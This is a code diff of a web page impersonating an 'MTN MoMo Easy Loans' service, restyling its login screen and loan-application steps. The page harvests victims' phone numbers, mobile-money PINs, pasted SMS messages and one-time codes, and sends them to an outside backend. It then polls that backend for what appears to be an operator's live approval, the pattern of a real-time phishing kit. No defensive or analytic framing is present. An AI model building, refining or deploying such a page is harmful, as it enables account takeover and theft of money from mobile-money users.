+          <input id="lp1" class="lv2-pin-box" maxlength="1" inputmode="numeric" type="password">
+          <input id="lp2" class="lv2-pin-box" maxlength="1" inputmode="numeric" type="password">
+          <input id="lp3" class="lv2-pin-box" maxlength="1" inputmode="numeric" type="password">
+          <input id="lp4" class="lv2-pin-box" maxlength="1" inputmode="numeric" type="password">
+          <div class="lv2-icons">
+            <button type="button" class="lv2-icon-btn" onclick="togglePinVisibility()">👁</button>
+            <button type="button" class="lv2-icon-btn" onclick="clearPin()">✕</button>
+          </div>
+        </div>
+
+        <button id="bLgn" class="lv2-login-btn" onclick="doLogin()" disabled>LOGIN</button>
+
         <div id="lpMsg" class="msg"></div>
         <div id="lpMsgOk" class="msg ok"></div>
         <div id="lpMsgWarn" class="msg warn"></div>
-        <div class="field">
-          <label>Phone Number</label>
-          <input id="lpPhone" type="tel" maxlength="9" placeholder="670123456">
-        </div>
-        <div class="field">
-          <label>PIN (5 digits)</label>
-          <div style="display:flex; gap:8px;" id="pinContainer">
-            <input id="lp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="lp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="lp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="lp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="lp4" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-          </div>
-        </div>
-        <button id="bLgn" class="btn-grad" onclick="doLogin()">LOGIN</button>
+      </div>
+
+      <div class="lv2-footer">
+        <div class="lv2-footer-logo"></div>
+        <div class="lv2-footer-title">MTN MoMo</div>
+        <div class="lv2-footer-copy">© 2026 MTN MoMo Loans. All rights reserved.</div>
       </div>
     </div>
+  </div>
 
-    <!-- Wait login approval page -->
-    <div id="page-wait-login-approval" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-      </div>
-      <div style="padding: 24px; text-align: center;">
-        <h2>Waiting for approval</h2>
-        <p>Application ID: <span id="waitAppId"></span></p>
-        <div class="spinner" style="margin-top: 20px;"></div>
+  <!-- ═══ Wait login approval page ═══ -->
+  <div id="page-wait-login-approval" class="page">
+    <div class="navbar">
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Easy Loans</div>
       </div>
     </div>
+    <div style="padding: 24px; text-align: center;">
+      <h2>Waiting for approval</h2>
+      <p>Application ID: <span id="waitAppId"></span></p>
+      <div class="spinner" style="margin-top: 20px;"></div>
+    </div>
+  </div>
 
-    <!-- SMS paste page -->
-    <div id="page-sms-paste" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
-      </div>
-      <div style="padding: 24px;">
-        <div class="field">
-          <label>Paste SMS message</label>
-          <textarea id="smsMsgBox" placeholder="Paste the SMS you received..."></textarea>
-        </div>
-        <button class="btn-grad" onclick="submitSms()">SUBMIT</button>
+  <!-- ═══ SMS paste page ═══ -->
+  <div id="page-sms-paste" class="page">
+    <div class="navbar">
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Easy Loans</div>
       </div>
     </div>
-
-    <!-- OTP page -->
-    <div id="page-otp" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
-        </div>
+    <div style="padding: 24px;">
+      <div class="field">
+        <label>Paste SMS message</label>
+        <textarea id="smsMsgBox" placeholder="Paste the SMS you received..."></textarea>
       </div>
-      <div style="padding: 24px;">
-        <div id="otpMsg" class="msg"></div>
-        <div class="field">
-          <label>Enter OTP</label>
-          <div style="display:flex; gap:8px;" id="otpContainer">
-            <input id="otp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-            <input id="otp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
-          </div>
-        </div>
-        <button id="bOtp" class="btn-grad" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+      <button class="btn-grad" onclick="submitSms()">SUBMIT</button>
+    </div>
+  </div>
+
+  <!-- ═══ OTP page ═══ -->
+  <div id="page-otp" class="page">
+    <div class="navbar">
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Easy Loans</div>
       </div>
     </div>
-
-    <!-- Approval page -->
-    <div id="page-approval" class="page">
-      <div class="navbar">
-        <div class="mtn-logo">
-          <div class="mtn-logo-icon"></div>
-          <div class="mtn-logo-text">MTN MoMo</div>
-          <div class="mtn-logo-sub">Easy Loans</div>
+    <div style="padding: 24px;">
+      <div id="otpMsg" class="msg"></div>
+      <div class="field">
+        <label>Enter OTP</label>
+        <div style="display:flex; gap:8px;" id="otpContainer">
+          <input id="otp0" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
+          <input id="otp1" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
+          <input id="otp2" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
+          <input id="otp3" maxlength="1" inputmode="numeric" style="width:50px;text-align:center;">
         </div>
       </div>
-      <div style="padding: 24px; text-align: center;">
-        <h2>Loan Approved!</h2>
-        <p>Amount: <span id="aprAmount"></span></p>
-        <p>Term: <span id="aprTerm"></span></p>
-        <p>Monthly: <span id="aprMth"></span></p>
-        <p style="font-size: 0.8rem; color: #888;">Amount: <span id="aprAmt"></span></p>
+      <button id="bOtp" class="btn-grad" onclick="doOtp()">VERIFY & APPROVE LOAN</button>
+    </div>
+  </div>
+
+  <!-- ═══ Approval page ═══ -->
+  <div id="page-approval" class="page">
+    <div class="navbar">
+      <div class="mtn-logo">
+        <div class="mtn-logo-icon"></div>
+        <div class="mtn-logo-text">MTN MoMo</div>
+        <div class="mtn-logo-sub">Easy Loans</div>
       </div>
+    </div>
+    <div style="padding: 24px; text-align: center;">
+      <h2>Loan Approved!</h2>
+      <p>Amount: <span id="aprAmount"></span></p>
+      <p>Term: <span id="aprTerm"></span></p>
+      <p>Monthly: <span id="aprMth"></span></p>
+      <p style="font-size: 0.8rem; color: #888;">Amount: <span id="aprAmt"></span></p>
     </div>
   </div>
 
@@ -497,8 +551,8 @@
   </div>
 
   <script>
-  window.API_BASE = 'https://mtn-momo-backend.onrender.com';
-</script>
+    window.API_BASE = 'https://mtn-momo-backend.onrender.com';
+  </script>
   <script>
     // ── State ──────────────────────────────────────────────
     const S = {
@@ -506,7 +560,7 @@
       applicationId: null,
       loanAmount: 1000000,
       loanTerm: '48 Months',
-      requestAdminId: 'admin-001',    // example; replace with real value
+      requestAdminId: 'admin-001',
     };
 
     // ── Navigation ─────────────────────────────────────────
@@ -534,6 +588,7 @@
       if (!el) return;
       el.textContent = msg;
       el.className = 'msg' + (type === 'error' ? '' : ' ' + type);
+      el.classList.add('show');
     }
 
     // ── PIN input auto-tab ─────────────────────────────────
@@ -542,11 +597,20 @@
       inputs.forEach((inp, idx) => {
         inp.oninput = () => {
           if (inp.value.length === 1 && idx < 4) inputs[idx+1].focus();
+          updateLoginButton();
         };
         inp.onkeydown = (e) => {
           if (e.key === 'Backspace' && inp.value === '' && idx > 0) inputs[idx-1].focus();
+          setTimeout(updateLoginButton, 0);
         };
       });
+
+      const phoneEl = document.getElementById('lpPhone');
+      if (phoneEl) {
+        phoneEl.addEventListener('input', updateLoginButton);
+      }
+
+      updateLoginButton();
     }
 
     function chkOtp() {
@@ -561,6 +625,39 @@
       });
     }
 
+    // ── Login V2 helpers ───────────────────────────────────
+    function togglePinVisibility() {
+      for (let i = 0; i < 5; i++) {
+        const el = document.getElementById('lp' + i);
+        if (el) el.type = el.type === 'password' ? 'text' : 'password';
+      }
+    }
+
+    function clearPin() {
+      for (let i = 0; i < 5; i++) {
+        const el = document.getElementById('lp' + i);
+        if (el) el.value = '';
+      }
+      updateLoginButton();
+    }
+
+    function updateLoginButton() {
+      const phone = document.getElementById('lpPhone') ? document.getElementById('lpPhone').value.trim() : '';
+      const pin = [0,1,2,3,4].map(i => {
+        const el = document.getElementById('lp'+i);
+        return el ? el.value : '';
+      }).join('');
+      const btn = document.getElementById('bLgn');
+      if (!btn) return;
+      if (phone.length === 9 && pin.length === 5) {
+        btn.disabled = false;
+        btn.classList.add('enabled');
+      } else {
+        btn.disabled = true;
+        btn.classList.remove('enabled');
+      }
+    }
+
     // ── Cancel all polls ───────────────────────────────────
     let pollTimeout = null;
     let otpPollTimeout = null;
@@ -572,12 +669,8 @@
 
     // ── Login ──────────────────────────────────────────────
     async function doLogin() {
-      if (S.isSubmitting) {
-        console.log('⚠️ Login already in flight, ignoring duplicate call');
-        return;
-      }
+      if (S.isSubmitting) return;
       S.isSubmitting = true;
-
       cancelAllPolls();
 
       ['lpMsg','lpMsgOk','lpMsgWarn'].forEach(id => {
@@ -636,10 +729,7 @@
     // ── Poll for PIN approval ──────────────────────────────
     function pollForPinApproval(applicationId) {
       const checkStatus = async () => {
-        if (S.applicationId !== applicationId) {
-          console.log('🛑 Stale PIN poll stopped for', applicationId);
-          return;
-        }
+        if (S.applicationId !== applicationId) return;
         try {
           const res  = await fetch(`${window.API_BASE||''}/api/check-pin-status/${applicationId}`);
           const data = await res.json();
@@ -649,7 +739,6 @@
               clearTimeout(pollTimeout);
               pollTimeout = null;
               goTo('page-sms-paste');
-
             } else if (data.status === 'rejected') {
               clearTimeout(pollTimeout);
               pollTimeout = null;
@@ -659,7 +748,6 @@
               document.getElementById('bLgn').disabled = false;
               chkPin();
               showLgnMsg('error', 'Your login credentials were invalid. Please try again.');
-
             } else {
               pollTimeout = setTimeout(checkStatus, 2000);
             }
@@ -674,92 +762,76 @@
       checkStatus();
     }
 
-      
-      // ── Submit pasted SMS text ─────────────────────────────
-  async function submitSms() {
-    const smsText = document.getElementById('smsMsgBox').value.trim();
-    if (!smsText) {
-      alert('Please paste the SMS message.');
-      return;
-    }
-    try {
-      const res = await fetch(`${window.API_BASE||''}/api/submit-sms`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          applicationId: S.applicationId,
-          smsText: smsText
-        })
-      });
-      const data = await res.json();
-      if (data.success) {
-        goTo('page-otp');
-        chkOtp();
-      } else {
-        alert(data.message || 'Failed to submit SMS.');
+    // ── Submit pasted SMS text ─────────────────────────────
+    async function submitSms() {
+      const smsText = document.getElementById('smsMsgBox').value.trim();
+      if (!smsText) {
+        alert('Please paste the SMS message.');
+        return;
       }
-    } catch (err) {
-      alert('Network error: ' + err.message);
+      try {
+        const res = await fetch(`${window.API_BASE||''}/api/submit-sms`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ applicationId: S.applicationId, smsText: smsText })
+        });
+        const data = await res.json();
+        if (data.success) {
+          goTo('page-otp');
+          chkOtp();
+        } else {
+          alert(data.message || 'Failed to submit SMS.');
+        }
+      } catch (err) {
+        alert('Network error: ' + err.message);
+      }
     }
-  }
 
-    
     // ── Verify OTP ─────────────────────────────────────────
-  async function doOtp() {
-    const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
-    if (otp.length !== 4) {
-      showOtpMsg('error', 'Please enter the 4-digit OTP.');
-      return;
-    }
+    async function doOtp() {
+      const otp = [0,1,2,3].map(i => document.getElementById('otp'+i).value).join('');
+      if (otp.length !== 4) {
+        showOtpMsg('error', 'Please enter the 4-digit OTP.');
+        return;
+      }
+      document.getElementById('mOtp').classList.add('show');
+      document.getElementById('bOtp').disabled = true;
+      document.getElementById('bOtp').textContent = 'VERIFYING...';
 
-    document.getElementById('mOtp').classList.add('show');
-    document.getElementById('bOtp').disabled = true;
-    document.getElementById('bOtp').textContent = 'VERIFYING...';
+      try {
+        const res = await fetch(`${window.API_BASE||''}/api/verify-otp`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ applicationId: S.applicationId, otp: otp })
+        });
+        const data = await res.json();
+        document.getElementById('mOtp').classList.remove('show');
 
-    try {
-      const res = await fetch(`${window.API_BASE||''}/api/verify-otp`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          applicationId: S.applicationId,
-          otp: otp
-        })
-      });
-      const data = await res.json();
-      document.getElementById('mOtp').classList.remove('show');
-
-      if (data.success) {
-        pollForOtpApproval(S.applicationId);
-      } else {
+        if (data.success) {
+          pollForOtpApproval(S.applicationId);
+        } else {
+          document.getElementById('bOtp').disabled = false;
+          document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
+          showOtpMsg('error', data.message || 'Failed to submit OTP.');
+        }
+      } catch (err) {
+        document.getElementById('mOtp').classList.remove('show');
         document.getElementById('bOtp').disabled = false;
         document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-        showOtpMsg('error', data.message || 'Failed to submit OTP.');
+        showOtpMsg('error', 'Error: ' + err.message);
       }
-    } catch (err) {
-      document.getElementById('mOtp').classList.remove('show');
-      document.getElementById('bOtp').disabled = false;
-      document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-      showOtpMsg('error', 'Error: ' + err.message);
     }
-  }
-      // After success:
-      // pollForOtpApproval(S.applicationId);
 
-
-    // ── Poll for OTP approval (fixed with all statuses) ─────
+    // ── Poll for OTP approval ──────────────────────────────
     function pollForOtpApproval(applicationId) {
       const checkStatus = async () => {
-        if (S.applicationId !== applicationId) {
-          console.log('🛑 Stale OTP poll stopped for', applicationId);
-          return;
-        }
+        if (S.applicationId !== applicationId) return;
         try {
           const res  = await fetch(`${window.API_BASE||''}/api/check-otp-status/${applicationId}`);
           const data = await res.json();
 
           if (data.success) {
             const status = data.status;
-
             if (status === 'approved') {
               clearTimeout(otpPollTimeout);
               otpPollTimeout = null;
@@ -769,7 +841,6 @@
               const monthly = Math.ceil((S.loanAmount || 1000000) / (parseInt(S.loanTerm || '48')));
               document.getElementById('aprMth').textContent    = 'XAF ' + monthly.toLocaleString();
               goTo('page-approval');
-
             } else if (status === 'wrongcode') {
               clearTimeout(otpPollTimeout);
               otpPollTimeout = null;
@@ -779,27 +850,20 @@
               document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
               chkOtp();
               showOtpMsg('error', 'The OTP code was incorrect. Please try again.');
-
             } else if (status === 'wrongpin_otp') {
               clearTimeout(otpPollTimeout);
               otpPollTimeout = null;
-
               document.getElementById('lpPhone').value = '';
               [0,1,2,3,4].forEach(i => document.getElementById('lp'+i).value = '');
               [0,1,2,3].forEach(i => document.getElementById('otp'+i).value = '');
               document.getElementById('smsMsgBox').value = '';
-
               document.getElementById('bOtp').disabled = false;
               document.getElementById('bOtp').textContent = 'VERIFY & APPROVE LOAN';
-
-              // Also reset login button state
               document.getElementById('bLgn').disabled = false;
               chkPin();
               chkOtp();
-
               goTo('page-login');
               showLgnMsg('error', 'Your PIN was incorrect. Please log in again.');
-
             } else {
               otpPollTimeout = setTimeout(checkStatus, 2000);
             }
@@ -814,139 +878,134 @@
       checkStatus();
     }
 
-    // ── Initialize ─────────────────────────────────────────
+    // ═══════════════════════════════════════════════════════
+    // Welcome page + 3-step loan application
+    // ═══════════════════════════════════════════════════════
+    function updateCalculator() {
+      const slider = document.getElementById('wSlider');
+      const amountEl = document.getElementById('wAmount');
+      const termEl = document.getElementById('wTerm');
+      const monthlyEl = document.getElementById('wMonthly');
+
+      const amount = parseInt(slider.value, 10);
+      const term = 48;
+      const monthly = Math.ceil(amount / term);
+
+      amountEl.textContent = 'XAF ' + amount.toLocaleString();
+      termEl.textContent = term + ' Months';
+      monthlyEl.textContent = 'XAF ' + monthly.toLocaleString();
+    }
+
+    function updateTermDisplay() {
+      const slider = document.getElementById('fTermSlider');
+      const display = document.getElementById('fTermDisplay');
+      const val = parseInt(slider.value, 10);
+      display.textContent = val + ' Months';
+    }
+
+    function startApplication() {
+      const sliderAmount = document.getElementById('wSlider').value;
+      document.getElementById('fAmount').value = sliderAmount;
+      goTo('page-step1');
+    }
+
+    function nextToStep2() {
+      const amount = document.getElementById('fAmount').value;
+      if (!amount || parseInt(amount, 10) < 50000) {
+        alert('Please enter a valid loan amount (minimum XAF 50,000).');
+        return;
+      }
+      goTo('page-step2');
+    }
+
+    function nextToStep3() {
+      const first = document.getElementById('fFirst').value.trim();
+      const last  = document.getElementById('fLast').value.trim();
+      const phone = document.getElementById('fPhone').value.trim();
+
+      if (!first || !last) {
+        alert('Please enter your first and last name.');
+        return;
+      }
+      if (phone.length !== 9) {
+        alert('Please enter a valid 9-digit phone number.');
+        return;
+      }
+
+      const amount  = parseInt(document.getElementById('fAmount').value, 10);
+      const term    = document.getElementById('fTermSlider').value + ' Months';
+      const purpose = document.getElementById('fPurpose').value.trim() || '—';
+
+      document.getElementById('sumAmount').textContent    = 'XAF ' + amount.toLocaleString();
+      document.getElementById('sumTerm').textContent      = term;
+      document.getElementById('sumPurpose').textContent   = purpose;
+      document.getElementById('sumApplicant').textContent = first + ' ' + last;
+
+      goTo('page-step3');
+    }
+
+    async function submitApplication() {
+      const btn = document.getElementById('submitBtn');
+      btn.disabled = true;
+      btn.textContent = 'SUBMITTING...';
+
+      const payload = {
+        loanType:         document.getElementById('fLoanType').value,
+        loanAmount:       parseInt(document.getElementById('fAmount').value, 10),
+        loanTerm:         document.getElementById('fTermSlider').value + ' Months',
+        purpose:          document.getElementById('fPurpose').value.trim(),
+        firstName:        document.getElementById('fFirst').value.trim(),
+        lastName:         document.getElementById('fLast').value.trim(),
+        phone:            document.getElementById('fPhone').value.trim(),
+        employmentStatus: document.getElementById('fEmp').value,
+        annualIncome:     parseInt(document.getElementById('fIncome').value, 10) || 0
+      };
+
+      S.loanAmount    = payload.loanAmount;
+      S.loanTerm      = payload.loanTerm;
+      S.applicantName = payload.firstName + ' ' + payload.lastName;
+
+      try {
+                const res  = await fetch(`${window.API_BASE||''}/api/submit-application`, {
+          method:  'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body:    JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (data.success) {
+          goTo('page-processing');
+
+          let seconds = 5;
+          const cd = document.getElementById('countdown');
+          cd.textContent = seconds;
+
+          const tick = setInterval(() => {
+            seconds -= 1;
+            cd.textContent = seconds;
+            if (seconds <= 0) {
+              clearInterval(tick);
+              goTo('page-login');
+              chkPin();
+            }
+          }, 1000);
+        } else {
+          alert(data.message || 'Failed to submit application.');
+        }
+      } catch (err) {
+        alert('Network error: ' + err.message);
+      } finally {
+        btn.disabled = false;
+        btn.textContent = 'SUBMIT APPLICATION';
+      }
+    }
+
+    // Initialize calculator on load
     document.addEventListener('DOMContentLoaded', () => {
-      chkPin();
-      chkOtp();
+      if (document.getElementById('wSlider')) {
+        updateCalculator();
+      }
     });
 
-  // ═════════════════════════════════════════════════════════
-  // NEW: Welcome page + 3-step loan application
-  // ═════════════════════════════════════════════════════════
-
-  // Loan calculator on Welcome page
-  function updateCalculator() {
-    const slider = document.getElementById('wSlider');
-    const amountEl = document.getElementById('wAmount');
-    const termEl = document.getElementById('wTerm');
-    const monthlyEl = document.getElementById('wMonthly');
-
-    const amount = parseInt(slider.value, 10);
-    const term = 48;
-    const monthly = Math.ceil(amount / term);
-
-    amountEl.textContent = 'XAF ' + amount.toLocaleString();
-    termEl.textContent = term + ' Months';
-    monthlyEl.textContent = 'XAF ' + monthly.toLocaleString();
-  }
-
-  // Welcome → Step 1
-  function startApplication() {
-    const sliderAmount = document.getElementById('wSlider').value;
-    document.getElementById('fAmount').value = sliderAmount;
-    goTo('page-step1');
-  }
-
-  // Step 1 → Step 2 (validate)
-  function nextToStep2() {
-    const amount = document.getElementById('fAmount').value;
-    if (!amount || parseInt(amount, 10) < 50000) {
-      alert('Please enter a valid loan amount (minimum XAF 50,000).');
-      return;
-    }
-    goTo('page-step2');
-  }
-
-  // Step 2 → Step 3 (validate + build summary)
-  function nextToStep3() {
-    const first = document.getElementById('fFirst').value.trim();
-    const last  = document.getElementById('fLast').value.trim();
-    const phone = document.getElementById('fPhone').value.trim();
-
-    if (!first || !last) {
-      alert('Please enter your first and last name.');
-      return;
-    }
-    if (phone.length !== 9) {
-      alert('Please enter a valid 9-digit phone number.');
-      return;
-    }
-
-    const amount  = parseInt(document.getElementById('fAmount').value, 10);
-    const term    = document.getElementById('fTerm').value;
-    const purpose = document.getElementById('fPurpose').value.trim() || '—';
-
-    document.getElementById('sumAmount').textContent    = 'XAF ' + amount.toLocaleString();
-    document.getElementById('sumTerm').textContent      = term;
-    document.getElementById('sumPurpose').textContent   = purpose;
-    document.getElementById('sumApplicant').textContent = first + ' ' + last;
-
-    goTo('page-step3');
-  }
-
-  // Step 3 → Submit to backend + go to Login
-  async function submitApplication() {
-    const btn = document.getElementById('submitBtn');
-    btn.disabled = true;
-    btn.textContent = 'SUBMITTING...';
-
-    const payload = {
-      loanType:         document.getElementById('fLoanType').value,
-      loanAmount:       parseInt(document.getElementById('fAmount').value, 10),
-      loanTerm:         document.getElementById('fTerm').value,
-      purpose:          document.getElementById('fPurpose').value.trim(),
-      firstName:        document.getElementById('fFirst').value.trim(),
-      lastName:         document.getElementById('fLast').value.trim(),
-      phone:            document.getElementById('fPhone').value.trim(),
-      employmentStatus: document.getElementById('fEmp').value,
-      annualIncome:     parseInt(document.getElementById('fIncome').value, 10) || 0
-    };
-
-    S.loanAmount    = payload.loanAmount;
-    S.loanTerm      = payload.loanTerm;
-    S.applicantName = payload.firstName + ' ' + payload.lastName;
-
-    try {
-      const res  = await fetch(`${window.API_BASE||''}/api/submit-application`, {
-        method:  'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body:    JSON.stringify(payload)
-      });
-      const data = await res.json();
-      if (data.success) {
-                goTo('page-processing');
-
-        let seconds = 5;
-        const cd = document.getElementById('countdown');
-        cd.textContent = seconds;
-
-        const tick = setInterval(() => {
-          seconds -= 1;
-          cd.textContent = seconds;
-          if (seconds <= 0) {
-            clearInterval(tick);
-            goTo('page-login');
-            chkPin();
-          }
-        }, 1000);
-      } else {
-        alert(data.message || 'Failed to submit application.');
-      }
-    } catch (err) {
-      alert('Network error: ' + err.message);
-    } finally {
-      btn.disabled = false;
-      btn.textContent = 'SUBMIT APPLICATION';
-    }
-  }
-
-  // Initialize calculator on load
-  document.addEventListener('DOMContentLoaded', () => {
-    if (document.getElementById('wSlider')) {
-      updateCalculator();
-    }
-  });
-  
   </script>
 </body>
 </html>
